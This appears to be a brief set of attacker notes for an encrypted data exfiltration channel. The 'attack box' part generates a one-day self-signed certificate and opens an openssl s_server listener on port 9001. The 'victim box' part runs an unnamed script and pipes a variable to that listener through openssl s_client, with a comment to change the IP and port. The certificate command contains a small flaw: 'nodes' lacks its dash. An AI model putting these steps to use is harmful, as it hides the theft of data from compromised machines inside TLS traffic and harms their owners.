# attack box
# run first
openssl req -x509 -newkey rsa:4096 -keyout key.pem -subj "/CN=$cn\/emailAddress=admin@$cn/C=US/ST=Ohio/L=Columbus/O=Widgets Inc/OU=Some Unit" -out cert.pem -days 1 nodes 2>/dev/null

# run second
openssl s_server -quiet -key key.pem -cert cert.pem -port 9001
# choose your own port

# victim box

# execute the ./<name>.sh script
# chmod +x name.sh

# run last
echo $p | openssl s_client -quiet -connect 127.0.0.1:9001 2>/dev/null
# change the IP address & port
